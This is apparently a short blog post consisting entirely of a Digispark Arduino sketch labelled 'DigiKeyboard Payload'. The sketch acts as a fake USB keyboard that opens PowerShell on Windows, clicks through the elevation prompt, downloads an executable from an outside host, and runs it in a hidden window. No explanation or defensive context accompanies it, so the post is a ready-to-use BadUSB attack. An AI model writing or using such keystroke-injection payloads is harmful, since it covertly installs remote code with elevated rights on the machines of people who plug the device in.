---
layout: post
author: cvxz
title:  "DigiKeyboard Payload"
date:   2020-02-11 11:27:06 -0300
categories: arduino
---

{% highlight c++ %}
#define LAYOUT_SPANISH_LATIN_AMERICA
#include "DigiKeyboard.h"

int LED_PIN = 1;
int KEY_DELAY = 2500;

void setup() {
  pinMode(LED_PIN, OUTPUT);
  
}

void loop() {
  digitalWrite(LED_PIN, HIGH);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.print("$errorActionPreference='Stop'; ");
  DigiKeyboard.print("(New-Object Net.Webclient).DownloadFile('https://90.cl/extra/m.exe','m.exe'); ");
  DigiKeyboard.print("Start-Process -FilePath 'm.exe' -WindowStyle hidden; exit;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(KEY_DELAY);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(KEY_DELAY);
  digitalWrite(LED_PIN, LOW);

  for(;;){ }
}
{% endhighlight %}